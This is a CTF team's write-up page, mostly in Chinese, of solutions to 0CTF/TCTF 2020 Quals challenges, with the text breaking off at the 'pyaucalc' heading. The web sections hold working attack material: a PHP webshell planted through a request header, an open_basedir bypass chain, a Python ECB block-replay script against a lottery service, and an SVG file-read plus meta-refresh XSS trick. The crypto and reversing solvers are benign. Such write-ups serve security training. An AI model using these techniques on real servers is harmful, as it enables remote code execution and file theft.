<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="apple-touch-icon" sizes="180x180" href="/assets/img/logo.png">
    <link rel="icon" type="image/png" sizes="192x192"  href="/assets/img/logo.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/assets/img/logo.png">
    <meta name="msapplication-TileColor" content="#ffffff">
    <meta name="msapplication-TileImage" content="/ms-icon-144x144.png">
    <meta name="theme-color" content="#ffffff">
    <title>0CTF/TCTF 2020 Quals Writeup | r3kapig</title>
    <meta property="og:title" content="r3kapig writeup" />
    <meta property="og:locale" content="en_US" />
    <meta name="description" content="Writeup for 0CTF/TCTF 2020 Quals Writeup" />
    <meta property="og:description" content="Writeup for 0CTF/TCTF 2020 Quals Writeup" />
    <link rel="canonical" href="https://r3kapig.com/writeup/" />
    <meta property="og:url" content="https://r3kapig.com/writeup/" />
    <meta property="og:site_name" content="r3kapig" />
    <link type="text/css" rel="stylesheet" href="../assets/css/github-markdown.css">
    <link type="text/css" rel="stylesheet" href="../assets/css/pilcrow.css">
    <link type="text/css" rel="stylesheet" href="../assets/css/hljs-github.min.css"/>
    <link type="text/css" rel="stylesheet" href="../assets/css/bootstrap-4.0.0-beta.3.min.css">
    <script type="text/javascript" src="../assets/js/jquery-3.3.1.slim.min.js"></script>
    <script type="text/javascript" src="../assets/js/bootstrap-4.0.0-beta.3.min.js"></script>
    <script type="text/javascript" src="../assets/js/popper-1.14.3.min.js"></script>
    <script type="text/javascript" src="../assets/js/mathjax-2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
  </head>
  <style>
  body {
      padding-top: 56px;
  }

  .sticky-offset {
      top: 56px;
  }

  #body-row {
      margin-left:0;
      margin-right:0;
  }
  #sidebar-container {
      min-height: 100vh;   
      background-color: #333;
      padding: 0;
  }

  /* Sidebar sizes when expanded and expanded */
  .sidebar-expanded {
      width: 230px;
  }
  .sidebar-collapsed {
      width: 60px;
  }

  /* Menu item*/
  #sidebar-container .list-group a {
      min-height: 50px;
      color: white;
  }

  /* Submenu item*/
  #sidebar-container .list-group .sidebar-submenu a {
      min-height: 45px;
      padding-left: 60px;
  }
  .sidebar-submenu {
      font-size: 0.9rem;
  }

  /* Separators */
  .sidebar-separator-title {
      background-color: #333;
      height: 35px;
  }
  .sidebar-separator {
      background-color: #333;
      height: 25px;
  }
  .logo-separator {
      background-color: #333;    
      height: 60px;
  }


  /* 
   active scrollspy
  */
  .list-group-item.active {
    border-color: transparent;
    border-left: #e69138 solid 4px;
  }

  /* 
   anchor padding top
   https://stackoverflow.com/a/28824157
  */
  :target:before {
    content:"";
    display:block;
    height:56px; /* fixed header height*/
    margin:-56px 0 0; /* negative fixed header height */
  }
  </style>
  
  <script>
  // https://stackoverflow.com/a/48330533
  $(window).on('activate.bs.scrollspy', function (event) {
    let active_collapse = $($('.list-group-item.active').parents()[0]);
    $(".collapse").removeClass("show");
    active_collapse.addClass("show");

    let parent_menu = $('a[href="#' + active_collapse[0].id + '"]');
    $('a[href^="#submenu"]').css("border-left", "");
    parent_menu.css("border-left","#e69138 solid 4px");
  });

  // http://docs.mathjax.org/en/latest/tex.html#tex-and-latex-math-delimiters
  MathJax.Hub.Config({
    tex2jax: {
      inlineMath: [['$','$'], ['\\(','\\)']],
      processEscapes: true
    }
  });
  </script>

  <body style="position: relative;" data-spy="scroll" data-target=".sidebar-submenu" data-offset="70">
    <nav class="navbar navbar-expand-md navbar-light bg-light fixed-top">
      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
        <span class="navbar-toggler-icon"></span>
      </button>
      <a class="navbar-brand" href="../">
        <img src="https://r3kapig.com/assets/img/logo.png" class="d-inline-block align-top" alt="" width="30" height="30">
        <span class="menu-collapsed">r3kapig / writeup</span>
      </a>
      <div class="collapse navbar-collapse" id="navbarNavDropdown">
        <ul class="navbar-nav my-2 my-lg-0">
            
            <li class="nav-item dropdown d-sm-block d-md-none">
              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                writeup
              </a>
              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
                                <a class="dropdown-item" href="#misccloud-computing">misccloud-computing</a>
    
                <a class="dropdown-item" href="#babyring">babyring</a>
    
                <a class="dropdown-item" href="#emmm">emmm</a>
    
                <a class="dropdown-item" href="#lottery">lottery</a>
    
                <a class="dropdown-item" href="#wechat-generator">wechat-generator</a>
    
                <a class="dropdown-item" href="#happy_tree">happy_tree</a>
    
                <a class="dropdown-item" href="#simple-curve">simple-curve</a>
    
                <a class="dropdown-item" href="#pyaucalc">pyaucalc</a>
    
                <a class="dropdown-item" href="#noeasyphp">noeasyphp</a>
    
                <a class="dropdown-item" href="#easyphp">easyphp</a>
    
                <a class="dropdown-item" href="#duet">duet</a>
    
                <a class="dropdown-item" href="#eeemoji">eeemoji</a>
    
                <a class="dropdown-item" href="#eeeeeemoji">eeeeeemoji</a>
    
                <a class="dropdown-item" href="#chromium-rce">chromium-rce</a>
    
                <a class="dropdown-item" href="#chromium-sbx">chromium-sbx</a>
    
                <a class="dropdown-item" href="#flash-1">flash-1</a>
    
                <a class="dropdown-item" href="#j">j</a>
    
                <a class="dropdown-item" href="#w">w</a>
    
                <a class="dropdown-item" href="#babymips">babymips</a>
    
              </div>
            </li>
    
        </ul>
      </div>
      <div class="order-3 dual-collapse2"> <!-- navbar-collapse w100 collapse -->
        <ul class="navbar-nav ml-auto" style="flex-direction: row;">
          <iframe src="https://ghbtns.com/github-btn.html?user=r3kapig&repo=writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
          <iframe src="https://ghbtns.com/github-btn.html?user=r3kapig&repo=writeup&type=star&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
        </ul>
      </div>
    </nav>
    <div class="row" id="body-row">
      <div id="sidebar-container" class="sidebar-expanded d-none d-md-block col-2">
        <ul class="list-group sticky-top sticky-offset">
          
          <a href="#submenu0" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
              <span class="fa fa-dashboard fa-fw mr-3"></span>
              <span class="menu-collapsed">writeup</span>
              <span class="submenu-icon ml-auto"></span>
            </div>
          </a>
          <div id="submenu0" class="collapse sidebar-submenu">
            <a href="#misccloud-computing" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">misccloud-computing</span>
            </a>
    
<a href="#babyring" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">babyring</span>
            </a>
    
<a href="#emmm" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">emmm</span>
            </a>
    
<a href="#lottery" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">lottery</span>
            </a>
    
<a href="#wechat-generator" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">wechat-generator</span>
            </a>
    
<a href="#happy_tree" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">happy_tree</span>
            </a>
    
<a href="#simple-curve" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">simple-curve</span>
            </a>
    
<a href="#pyaucalc" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">pyaucalc</span>
            </a>
    
<a href="#noeasyphp" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">noeasyphp</span>
            </a>
    
<a href="#easyphp" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">easyphp</span>
            </a>
    
<a href="#duet" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">duet</span>
            </a>
    
<a href="#eeemoji" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">eeemoji</span>
            </a>
    
<a href="#eeeeeemoji" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">eeeeeemoji</span>
            </a>
    
<a href="#chromium-rce" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">chromium-rce</span>
            </a>
    
<a href="#chromium-sbx" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">chromium-sbx</span>
            </a>
    
<a href="#flash-1" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">flash-1</span>
            </a>
    
<a href="#j" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">j</span>
            </a>
    
<a href="#w" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">w</span>
            </a>
    
<a href="#babymips" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">babymips</span>
            </a>
    
          </div>
    
        </ul>
      </div>
      <div class="col-10 py-3">
        <article class="markdown-body"><h1 id="0ctftctf-2020-quals-writeup"><a class="header-link" href="#0ctftctf-2020-quals-writeup"></a>0CTF/TCTF 2020 Quals Writeup</h1>
<h2 id="writeup"><a class="header-link" href="#writeup"></a>Writeup</h2>
<h3 id="misccloud-computing"><a class="header-link" href="#misccloud-computing"></a>Misc/Cloud Computing</h3>
<p>简单fuzz后，选择使用header来绕过并rce</p>
<pre class="hljs"><code>http:<span class="hljs-comment">//pwnable.org:47780/?action=upload&amp;data=<span class="hljs-meta">&lt;?=</span>end(getallheaders());<span class="hljs-meta">?&gt;</span></span>

header最后一个字段加上:<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[a]);</code></pre><p>加上<code>error_reporting(-1)</code>再<code>scandir()</code>得到报错发现有openbasedir和disable_function， 绕过一下：</p>
<pre class="hljs"><code>error_reporting(E_ALL);mkdir(<span class="hljs-string">&#x27;/var/www/html/sandbox/xxxxxxxxxxxx/AAA&#x27;</span>);chdir(<span class="hljs-string">&#x27;/var/www/html/sandbox/xxxxxxxxxxxx/AAA&#x27;</span>);ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;..&#x27;</span>);chdir(<span class="hljs-string">&#x27;..&#x27;</span>);chdir(<span class="hljs-string">&#x27;..&#x27;</span>);chdir(<span class="hljs-string">&#x27;..&#x27;</span>);chdir(<span class="hljs-string">&#x27;..&#x27;</span>);chdir(<span class="hljs-string">&#x27;..&#x27;</span>);chdir(<span class="hljs-string">&#x27;..&#x27;</span>);chdir(<span class="hljs-string">&#x27;..&#x27;</span>);chdir(<span class="hljs-string">&#x27;..&#x27;</span>);chdir(<span class="hljs-string">&#x27;..&#x27;</span>);ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>);</code></pre><p>然后<code>readfile(&#39;/flag&#39;)</code>发现是乱码，<code>base64_encode(file_get_contents(&#39;/flag&#39;))</code>先转base64再本地转一下，file命令查看发现是gzip压缩包，解压出来一个文件系统</p>
<pre class="hljs"><code><span class="hljs-attribute">Linux</span> rev <span class="hljs-number">1</span>.<span class="hljs-number">0</span> ext<span class="hljs-number">2</span> filesystem data (mounted or unclean), UUID=d<span class="hljs-number">4</span>d<span class="hljs-number">08581</span>-e<span class="hljs-number">309</span>-<span class="hljs-number">4</span>c<span class="hljs-number">51</span>-<span class="hljs-number">990</span>b-<span class="hljs-number">6472</span>ba<span class="hljs-number">249420</span> (large files)</code></pre><p>使用r-studio恢复数据得到flag</p>
<h3 id="babyring"><a class="header-link" href="#babyring"></a>babyring</h3>
<p>hash碰撞</p>
<p>随机生成 2^16 个msg，每个msg生成一个rc4的异或和，一共 2^16 个
随机生成 2^16 个x1，每个x1生成一个ys1，一共 2^16 个
随机生成 2^16 个x2，每个x1生成一个ys2，一共 2^16 个
随机生成 2^16 个x3，每个x1生成一个ys3，一共 2^^16 个
每个rc4异或和与每个ys1异或，得到2^32个值，打表
每个ys2与每个ys3异或，得到2^32个值，打表</p>
<p>找到两个表中相同的元素即可</p>
<h3 id="emmm"><a class="header-link" href="#emmm"></a>emmm</h3>
<p>设res文件里的值为 (x_i, y_i)</p>
<p>假如能找到一组 (x1,y1),(x2,y2) 满足 x1*n=x2 (mod p)，且n比较小，就能够 O(n^2) 求解 k1</p>
<pre class="hljs"><code><span class="hljs-attr">tmp0</span> = x * k0 % p
<span class="hljs-attr">tmp1</span> = tmp0  * c % m
<span class="hljs-attr">tmp2</span> = tmp1 * k1 % p</code></pre><p>考虑 encrypt(n*x1)</p>
<p>tmp0 = (n*x1) * k0 % p = n * (x1 * k0 % p) - t1 * p   （0≤t1&lt;n）
tmp1 = n * (x1 * k0 % p * c % m) + (-t1 * p * c) % m - t2 * m  （0≤t2≤n）
(模p意义下) y2 = tmp2 = n * y1 + ((-t1 * p * c) % m - t2 * m) * k1</p>
<p>枚举 t1,t2 就能解 k1</p>
<p>因为有 2^24 个x，所以有 2^48 组(x1,x2)，p有58位，n大概最小能到 2^12 左右</p>
<pre class="hljs"><code><span class="hljs-attribute">K0</span> = <span class="hljs-number">134854706973672807</span>
<span class="hljs-attribute">K1</span> = <span class="hljs-number">187692079449969593</span>
<span class="hljs-attribute">invC</span> = <span class="hljs-number">1131579515458719391</span>
<span class="hljs-attribute">def</span> inv(x):
    <span class="hljs-attribute">return</span> pow(x,P-<span class="hljs-number">2</span>,P)
<span class="hljs-attribute">def</span> decrypt(y,K<span class="hljs-number">0</span>,K<span class="hljs-number">1</span>):
    <span class="hljs-attribute">global</span> P,C,M
    <span class="hljs-attribute">ans</span> =<span class="hljs-meta"> []</span>
    <span class="hljs-attribute">for</span> t<span class="hljs-number">3</span> in range(<span class="hljs-number">5</span>):
        <span class="hljs-attribute">x</span> = (y * inv(K<span class="hljs-number">1</span>) % P + P*t<span class="hljs-number">3</span>) * invC % M * inv(K<span class="hljs-number">0</span>) % P
        <span class="hljs-attribute">if</span> encrypt_block(x)==y:
            <span class="hljs-attribute">ans</span>.append(x)
    <span class="hljs-attribute">return</span> ans</code></pre><h3 id="lottery"><a class="header-link" href="#lottery"></a>lottery</h3>
<p>ecb重放。16字节一个block，替换前4个block。注意的是，会更换user的前一个byte，因此我们需要找到和我们的目标user第一个byte相同的用户。多开，爆破之。</p>
<pre class="hljs"><code><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> base64
<span class="hljs-keyword">import</span> re
url = <span class="hljs-string">&quot;http://pwnable.org:2333/user/register&quot;</span>
url_login = <span class="hljs-string">&quot;http://pwnable.org:2333/user/login&quot;</span>
url_buy=<span class="hljs-string">&quot;http://pwnable.org:2333/lottery/buy&quot;</span>
url_info=<span class="hljs-string">&quot;http://pwnable.org:2333/lottery/info&quot;</span>

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_enc_from_username</span>(<span class="hljs-params">un</span>):</span>
    session = requests.session()
    data={
    <span class="hljs-string">&#x27;username&#x27;</span>:un,
    <span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-string">&quot;aaaa&quot;</span>
    }
    register=requests.post(url=url,data=data)
    login=session.post(url=url_login,data=data)
    pattern=re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;&quot;api_token&quot;:&quot;(.*?)&quot;,&quot;coin&#x27;</span>)
    m=re.findall(pattern,login.text)

    buy_data={
    <span class="hljs-string">&#x27;api_token&#x27;</span>:m[<span class="hljs-number">0</span>]
    }

    buy=session.post(url=url_buy,data=buy_data)
    pattern=re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;&quot;enc&quot;:&quot;(.*?)&quot;&#x27;</span>)
    n=re.findall(pattern,buy.text)
    <span class="hljs-keyword">return</span> n[<span class="hljs-number">0</span>]

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">info</span>(<span class="hljs-params">enc</span>):</span>
    session = requests.session()
    info_data = {
        <span class="hljs-string">&#x27;enc&#x27;</span>: enc
    }
    info = session.post(url=url_info, data=info_data)
    pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;&quot;lottery&quot;:&quot;(.*?)&quot;,&quot;user&quot;:&#x27;</span>)
    l = re.findall(pattern, info.text)
    <span class="hljs-built_in">print</span> info.text
    <span class="hljs-comment"># print(info.text)</span>
    <span class="hljs-comment"># print(&quot;lottery: &quot; + l[0] + &quot;\n&quot;)</span>
    pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;,&quot;user&quot;:&quot;(.*?)&quot;,&quot;coin&quot;:&#x27;</span>)
    u = re.findall(pattern, info.text)
    <span class="hljs-keyword">return</span> u[<span class="hljs-number">0</span>]

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">charge</span>(<span class="hljs-params">enc</span>):</span>
    session = requests.session()
    info_data = {
        <span class="hljs-string">&#x27;enc&#x27;</span>: enc
    }

    info = session.post(url=url_info, data=info_data)
    pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;&quot;lottery&quot;:&quot;(.*?)&quot;,&quot;user&quot;:&#x27;</span>)
    l = re.findall(pattern, info.text)
    <span class="hljs-comment"># print(info.text)</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;lottery: &quot;</span> + l[<span class="hljs-number">0</span>] + <span class="hljs-string">&quot;\n&quot;</span>)
    pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;,&quot;user&quot;:&quot;(.*?)&quot;,&quot;coin&quot;:&#x27;</span>)
    u = re.findall(pattern, info.text)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;user: &quot;</span> + u[<span class="hljs-number">0</span>])
    pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;&quot;coin&quot;:(.*?)}&#x27;</span>)
    c = re.findall(pattern, info.text)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;coin: &quot;</span> + c[<span class="hljs-number">0</span>])

    url_get_money_back = <span class="hljs-string">&quot;http://pwnable.org:2333/lottery/charge&quot;</span>
    get_money_back = {
        <span class="hljs-string">&#x27;user&#x27;</span>: u[<span class="hljs-number">0</span>],
        <span class="hljs-string">&#x27;coin&#x27;</span>: c[<span class="hljs-number">0</span>],
        <span class="hljs-string">&#x27;enc&#x27;</span>: enc
    }
    get_back = session.post(url=url_get_money_back, data=get_money_back)
    <span class="hljs-built_in">print</span>(get_back.text)

<span class="hljs-keyword">import</span> os
<span class="hljs-comment">#enc1=get_enc_from_username(&quot;fuckallo&quot;)</span>
<span class="hljs-comment">#print enc1</span>
enc1=<span class="hljs-string">&quot;6\/cdkogK5Y+4ov\/k0oN0UVZE5L1O+24nfQyb3lXqduDOoB\/0trCCcL7bzXD73vyMXpUU4K\/Fls5GL03lgVvBYrk1ARz+kOioplCU7+SMuDJpjFuc1QqQz7hMzncIGijYjPkY23IMIpBaPqBZ5op6hvbSt9reYD8AcCI4hIXsxZg=&quot;</span>
<span class="hljs-comment">#pre1=info(enc1)[0:2]</span>
<span class="hljs-comment">#print pre1</span>
pre1=<span class="hljs-string">&quot;11&quot;</span>
<span class="hljs-comment">#raw_input()</span>
<span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:
    name=os.urandom(<span class="hljs-number">4</span>).encode(<span class="hljs-string">&quot;hex&quot;</span>)
    enc2 = get_enc_from_username(name)
    pre2=info(enc2)[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>]
    <span class="hljs-built_in">print</span> pre1,pre2
    <span class="hljs-keyword">if</span> pre2==pre1:
        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;find&quot;</span>
        fakeenc=base64.b64encode(enc2.decode(<span class="hljs-string">&quot;base64&quot;</span>)[<span class="hljs-number">0</span>:<span class="hljs-number">64</span>]+enc1.decode(<span class="hljs-string">&quot;base64&quot;</span>)[<span class="hljs-number">64</span>:])
        charge(fakeenc)</code></pre><h3 id="wechat-generator"><a class="header-link" href="#wechat-generator"></a>Wechat Generator</h3>
<p>在svg转换为png图片的时候，可以向svg中插入image标签来读取任意文件，读取app.py得到secret路由
<img src="https://i.imgur.com/BuvddkK.png" alt=""></p>
<p>发现需要寻找到一个XSS，当将imagemagick转换的后缀名改为htm以后，得到一个html页面，可以插入html标签：</p>
<p class="img-container"><img src="https://i.imgur.com/mbm8pZm.png" alt=""></p>
<p>发现被CSP拦截，但是发现CSP没有限制meta标签的跳转，同时题目只需要alert(1)即可获得flag，故使用meta标签跳转到自己的vps上触发alert(1)，获得flag，src等参数的过滤可以通过双写绕过</p>
<p><code>&lt;memetata name=&quot;language&quot; content=&quot;0;http://vps/a.html&quot; http-equiv=&quot;refresh&quot;&quot; /&gt;</code></p>
<h3 id="happy_tree"><a class="header-link" href="#happy_tree"></a>Happy_tree</h3>
<p>整个程序的执行逻辑存储在一个树状的结构中（多叉树），其中每个节点的结构体如下所示：</p>
<pre class="hljs"><code>struct tree_node{
    DWORD multiple/opcode<span class="hljs-comment">;</span>
    DWORD width<span class="hljs-comment">;</span>
    DWORD func_handle<span class="hljs-comment">;</span>
    DWORD node_cnt<span class="hljs-comment">;</span>
    tree_node** a5<span class="hljs-comment">;</span>
}</code></pre><p>由 func_handle 决定该节点的功能和向下遍历的方式，根节点为 <code>0x000271D0</code>
解决方法就是写个脚本把执行过程打印出来，然后看计算逻辑
最后解密脚本如下:</p>
<pre class="hljs"><code><span class="hljs-attribute">import</span> os
<span class="hljs-attribute">import</span> binascii
<span class="hljs-attribute">check</span> =<span class="hljs-meta"> [
    0xa25dc66a,0x00aa0036,0xc64e001a,0x369d0854,0xf15bcf8f,
    0x6bbe1965,0x1966cd91,0xd4c5fbfd,0xb04a9b1b
]</span>
<span class="hljs-attribute">dword</span> = <span class="hljs-number">0</span>x<span class="hljs-number">67616</span>c<span class="hljs-number">66</span>
<span class="hljs-attribute">for</span> i in range(<span class="hljs-number">100000</span>):
    <span class="hljs-attribute">dword</span> = dword ^ (dword &lt;&lt; <span class="hljs-number">0</span>xd)
    <span class="hljs-attribute">dword</span> &amp;= <span class="hljs-number">0</span>xffffffff
    <span class="hljs-attribute">dword</span> = dword ^ (dword &gt;&gt; <span class="hljs-number">0</span>x<span class="hljs-number">11</span>)
    <span class="hljs-attribute">dword</span> &amp;= <span class="hljs-number">0</span>xffffffff
    <span class="hljs-attribute">dword</span> = dword ^ (dword &lt;&lt; <span class="hljs-number">5</span>)
    <span class="hljs-attribute">dword</span> &amp;= <span class="hljs-number">0</span>xffffffff
<span class="hljs-attribute">print</span> hex(dword)
<span class="hljs-attribute">ans</span> = &#x27;&#x27;
<span class="hljs-attribute">cnt</span> = <span class="hljs-number">0</span>
<span class="hljs-attribute">for</span> x in check:
    <span class="hljs-attribute">dword</span> = x
    <span class="hljs-attribute">for</span> j in range(<span class="hljs-number">100000</span>):
        <span class="hljs-attribute">t</span> = <span class="hljs-number">0</span>x<span class="hljs-number">1</span>f
        <span class="hljs-attribute">for</span> k in range(<span class="hljs-number">32</span>/<span class="hljs-number">5</span>+<span class="hljs-number">1</span>):
            <span class="hljs-attribute">tmp</span> = dword &amp; t
            <span class="hljs-attribute">tmp</span> = tmp &lt;&lt; <span class="hljs-number">5</span>
            <span class="hljs-attribute">dword</span> = tmp ^ dword
            <span class="hljs-attribute">t</span> = t &lt;&lt; <span class="hljs-number">5</span>
        <span class="hljs-attribute">dword</span> = dword &amp; <span class="hljs-number">0</span>xffffffff
        <span class="hljs-attribute">t</span> = <span class="hljs-number">0</span>xffff<span class="hljs-number">8000</span>
        <span class="hljs-attribute">for</span> k in range(<span class="hljs-number">32</span>/<span class="hljs-number">0</span>x<span class="hljs-number">11</span>+<span class="hljs-number">1</span>):
            <span class="hljs-attribute">tmp</span> = dword &amp; t
            <span class="hljs-attribute">tmp</span> = tmp &gt;&gt; <span class="hljs-number">0</span>x<span class="hljs-number">11</span>
            <span class="hljs-attribute">dword</span> = tmp ^ dword
            <span class="hljs-attribute">t</span> = t &gt;&gt; <span class="hljs-number">0</span>x<span class="hljs-number">11</span>
        <span class="hljs-attribute">dword</span> = dword &amp; <span class="hljs-number">0</span>xffffffff
        <span class="hljs-attribute">t</span> = <span class="hljs-number">0</span>x<span class="hljs-number">1</span>fff
        <span class="hljs-attribute">for</span> k in range(<span class="hljs-number">32</span>/<span class="hljs-number">0</span>xd+<span class="hljs-number">1</span>):
            <span class="hljs-attribute">tmp</span> = dword &amp; t
            <span class="hljs-attribute">tmp</span> = tmp &lt;&lt; <span class="hljs-number">0</span>xd
            <span class="hljs-attribute">dword</span> = tmp ^ dword
            <span class="hljs-attribute">t</span> = t &lt;&lt; <span class="hljs-number">0</span>xd
        <span class="hljs-attribute">dword</span> = dword &amp; <span class="hljs-number">0</span>xffffffff
    <span class="hljs-attribute">if</span> cnt % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>:
        <span class="hljs-attribute">ans</span> += binascii.a<span class="hljs-number">2</span>b_hex(hex(dword)[<span class="hljs-number">2</span>:-<span class="hljs-number">1</span>])[::-<span class="hljs-number">1</span>]
    <span class="hljs-attribute">else</span>:
        <span class="hljs-attribute">ans</span> += binascii.a<span class="hljs-number">2</span>b_hex(hex(dword^<span class="hljs-number">0</span>xaaaaaaaa)[<span class="hljs-number">2</span>:-<span class="hljs-number">1</span>])[::-<span class="hljs-number">1</span>]    
    <span class="hljs-attribute">cnt</span> += <span class="hljs-number">1</span>
    <span class="hljs-attribute">print</span> hex(dword)
<span class="hljs-attribute">print</span> ans</code></pre><h3 id="simple-curve"><a class="header-link" href="#simple-curve"></a>Simple Curve</h3>
<p>We implemented this attack method <a href="https://www.math.uwaterloo.ca/~ajmeneze/publications/hyperelliptic.pdf">https://www.math.uwaterloo.ca/~ajmeneze/publications/hyperelliptic.pdf</a></p>
<p>The calc() is giving us order part and then inverse mod.</p>
<pre class="hljs"><code>U, V = (<span class="hljs-literal">[<span class="hljs-number">113832590633816699072296178013238414056344242047498922038140127850188287361982</span>, <span class="hljs-number">107565990181246983920093578624450838959059911990845389169965709337104431186583</span>, <span class="hljs-number">1</span>]</span>, <span class="hljs-literal">[<span class="hljs-number">60811562094598445636243277376189331059312500825950206260715002194681628361141</span>, <span class="hljs-number">109257511993433204574833526052641479730322989843001720806658798963521316354418</span>]</span>)
F = <span class="hljs-constructor">GF(2^256)</span>
PP.&lt;u&gt; = <span class="hljs-constructor">PolynomialRing(F)</span>
h = u^<span class="hljs-number">2</span> + u
f = u^<span class="hljs-number">5</span> + u^<span class="hljs-number">3</span> + <span class="hljs-number">1</span>
H = <span class="hljs-constructor">HyperellipticCurve(<span class="hljs-params">f</span>, <span class="hljs-params">h</span>)</span>
J = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">H</span>.</span></span>jacobian<span class="hljs-literal">()</span>
X = <span class="hljs-constructor">J(F)</span>

U = map(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">F</span>.</span></span>fetch_int, U)
V = map(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">F</span>.</span></span>fetch_int, V)
t = <span class="hljs-constructor">X([U[0] + U[1] <span class="hljs-operator">*</span> <span class="hljs-params">u</span> + <span class="hljs-params">u</span>^2, V[0] + V[1] <span class="hljs-operator">*</span> <span class="hljs-params">u</span>])</span>

def calc(n):
    F = <span class="hljs-constructor">GF(2^1)</span>
    PP.&lt;u&gt; = <span class="hljs-constructor">PolynomialRing(F)</span>
    h = u^<span class="hljs-number">2</span> + u
    f = u^<span class="hljs-number">5</span> + u^<span class="hljs-number">3</span> + <span class="hljs-number">1</span>
    H = <span class="hljs-constructor">HyperellipticCurve(<span class="hljs-params">f</span>, <span class="hljs-params">h</span>)</span>
    J = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">H</span>.</span></span>jacobian<span class="hljs-literal">()</span>
    X = <span class="hljs-constructor">J(F)</span>
    
    cs = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">H</span>.</span></span>count<span class="hljs-constructor">_points(2 <span class="hljs-operator">*</span> <span class="hljs-params">n</span>)</span>
    c1 = cs<span class="hljs-literal">[<span class="hljs-identifier">n</span> - <span class="hljs-number">1</span>]</span>
    c2 = cs<span class="hljs-literal">[-<span class="hljs-number">1</span>]</span>
    
    s1 = <span class="hljs-number">2</span>^n - c1
    s2 = (c2 - <span class="hljs-number">2</span>^(<span class="hljs-number">2</span><span class="hljs-operator"> * </span>n) + s1^<span class="hljs-number">2</span>)<span class="hljs-operator"> / </span><span class="hljs-number">2</span>
    
    ksi = <span class="hljs-number">1</span> - s1 + s2 - s1<span class="hljs-operator"> * </span><span class="hljs-number">2</span>^n + <span class="hljs-number">2</span>^(<span class="hljs-number">2</span><span class="hljs-operator"> * </span>n)
    
    return ksi - c1 - <span class="hljs-number">1</span>

n = calc(<span class="hljs-number">256</span>)

k = inverse<span class="hljs-constructor">_mod(65537, <span class="hljs-params">n</span>)</span>
t2 = t<span class="hljs-operator"> * </span>k
print <span class="hljs-string">&quot;flag{&quot;</span> + hex(t2<span class="hljs-literal">[<span class="hljs-number">0</span>]</span>.roots<span class="hljs-literal">()</span><span class="hljs-literal">[<span class="hljs-number">0</span>]</span><span class="hljs-literal">[<span class="hljs-number">0</span>]</span>.integer<span class="hljs-constructor">_representation()</span>)<span class="hljs-literal">[<span class="hljs-number">2</span>:-<span class="hljs-number">1</span>]</span>.decode(<span class="hljs-string">&quot;hex&quot;</span>) +<span class="hljs-string">&quot;}&quot;</span></code></pre><h3 id="pyaucalc"><a class="header-link" href="#pyaucalc"></a>pyaucalc</h3>
